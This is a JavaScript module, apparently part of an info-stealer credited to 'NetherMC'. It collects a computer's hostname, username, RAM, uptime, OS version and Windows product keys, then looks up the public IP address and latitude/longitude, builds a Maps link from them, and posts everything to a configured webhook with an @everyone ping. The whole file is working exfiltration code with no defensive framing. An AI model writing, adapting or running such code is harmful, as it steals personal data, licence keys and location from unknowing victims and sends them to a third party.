const { webhook } = require('../../config');
const { isValidURL } = require('../string');
const axios = require('axios');
const moment = require('moment');
const os = require('os');
const { filesize } = require('filesize');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const json = async () => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  return {
    content: '@everyone',
    allowed_mentions: {
      parse: ['everyone'],
    },
    embeds: [
      {
        title: webhook.sentences[Math.floor(Math.random() * webhook.sentences.length)],
        description:
          `**Computer info:**
          <:dotfill:856638361678250044> RAM: ${filesize(os.totalmem())}
          <:dotfill:856638361678250044> Name: ${os.hostname()}
          <:dotfill:856638361678250044> Uptime: <t:${Math.round(Date.now() / 1000) - os.uptime()}:R> (<t:${Math.round(Date.now() / 1000) - os.uptime()}:f>)
          <:dotfill:856638361678250044> Username: ${os.userInfo().username}
          <:dotfill:856638361678250044> OS version: ${os.version()}
          <:dotfill:856638361678250044> Product Key: \`\`${require('./product-key').productKey}\`\`
          <:dotfill:856638361678250044> Backup Product Key: \`\`${require('./product-key').backupProductKey}\`\`
          **IP info:**
          <:dotfill:856638361678250044> IP Address: ${await ipInfo('query')}
          <:dotfill:856638361678250044> Location: [${await ipInfo('lat')}, ${await ipInfo('lon')}](https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')})`,
        footer: {
          text: 'Made by NetherMC (github.com/NetherMCtv)'
        },
        timestamp: moment(Date.now()).toISOString()
      }
    ]
  };
};

(async () => {
  await axios.post(webhook.url, await json(), {
    headers: {
      'Content-Type': 'application/json'
    }
  })
    .then(res => {
      if (res.status !== 200) return;
      return res.data;
    })
    .catch(err => {
      console.error(err.response.data);
    });
})();
